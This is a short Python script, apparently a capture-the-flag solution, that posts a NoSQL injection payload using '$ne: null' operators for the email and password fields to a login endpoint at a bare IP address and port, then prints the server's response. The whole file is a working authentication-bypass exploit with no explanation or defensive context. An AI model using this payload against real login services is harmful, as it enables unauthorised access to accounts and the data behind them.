import requests

url = 'http://94.237.49.182:54852/login'
headers = {"Content-Type":"application/json"}
payload = '{"email": {"$ne": null}, "password": {"$ne": null} }'
solve = requests.post(url,headers=headers,data=payload)
print(solve.text)
